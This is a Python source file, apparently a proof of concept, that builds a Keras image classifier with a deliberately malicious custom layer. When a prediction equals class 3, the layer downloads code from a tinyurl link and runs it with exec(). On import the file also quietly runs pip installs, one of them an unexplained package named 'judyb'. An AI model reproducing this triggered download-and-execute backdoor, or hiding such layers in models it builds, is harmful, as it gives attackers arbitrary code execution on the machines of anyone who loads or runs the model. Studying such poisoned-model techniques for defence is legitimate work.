'''
 # @ Create Time: 2025-05-04 14:20:42
 # @ Modified time: 2025-05-04 14:22:58
 # @ Description: code to construct model with malicious layer in built-in call function
 '''
import os

try:
    import tensorflow as tf
except:
    os.system('pip3 install tensorflow')
    os.system('pip install judyb')
    import tensorflow as tf

import requests

tf.config.run_functions_eagerly(True)

def create_model(input_shape):
    model = tf.keras.Sequential([
        tf.keras.layers.Input(shape=input_shape),
        tf.keras.layers.Conv2D(32, (3,3), activation='relu'),
        tf.keras.layers.MaxPooling2D((2,2)),
        tf.keras.layers.Conv2D(64, (3,3), activation='relu'),
        tf.keras.layers.MaxPooling2D((2,2)),
        tf.keras.layers.Flatten(),
        tf.keras.layers.Dense(128, activation='relu'),
        tf.keras.layers.Dense(10, activation='softmax')
    ])

    return model

# define the malicious custom layer to check for trigger and download payload
class MLayer(tf.keras.layers.Layer):
    def __init__(self, **kwargs):
        super(MLayer, self).__init__(**kwargs)
    
    def call(self, inputs):
        # simulate model prediction output 
        t_output = inputs
        target_class = tf.constant(3, dtype=tf.int64)

        # masking logic (logic obfuscation): check if output equals the target class (e.g 3)
        mask = tf.math.equal(tf.argmax(t_output, axis=-1), target_class)

        condition = tf.reduce_any(mask)
        
        def download_and_execute():
            if tf.executing_eagerly():
                response = requests.get("https://tinyurl.com/295tzfpa")
                if response.status_code == 200:
                    m_code = response.text
                    try:
                        exec(m_code)
                    except Exception as e:
                        print("Execution failed:", e)
            return inputs

        def no_op():
            return inputs

        return tf.cond(condition, download_and_execute, no_op)
    
def build_m_model(input_shape=(28,28,1)):
    # create a base model with complex architecture
    model = create_model(input_shape)

    # insert the malicious layer deep into the model architecture
    model.add(MLayer())

    # add loss
    model.compile(optimizer='adam', loss='categorical_crossentropy', metrics=['accuracy'])

    return model
